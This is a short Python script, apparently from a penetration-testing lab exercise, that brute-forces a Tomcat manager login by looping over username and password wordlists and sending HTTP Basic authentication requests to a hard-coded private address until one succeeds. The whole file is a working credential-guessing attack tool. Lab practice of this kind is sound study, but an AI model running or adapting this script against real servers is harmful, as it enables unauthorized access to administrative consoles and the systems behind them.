"""
Title: tomcat-login-brute
Date: 20181116
Author: epi <epibar052@gmail.com>
  https://epi052.gitlab.io/notes-to-self/
Tested on: 
    Linux kali 4.17.0-kali3-amd64 
    Python 3.6.6
    requests 2.18.4
"""
import requests
from requests.auth import HTTPBasicAuth

with open("tomcat-users") as users, open("tomcat-passwords") as passwords:
    for user in users:
        user = user.strip()  # remove trailing newline 
        passwords.seek(0)  # go to 0th byte in the file, i.e. the beginning
        for password in passwords:
            password = password.strip()
            resp = requests.get('http://10.10.10.95:8080/manager', auth=HTTPBasicAuth(user, password))
            if resp.status_code != 200: 
                # unauthorized request
                continue
            print(f'[+] Found credentials: {user}:{password}')
            raise SystemExit  # got what we can for, just exit
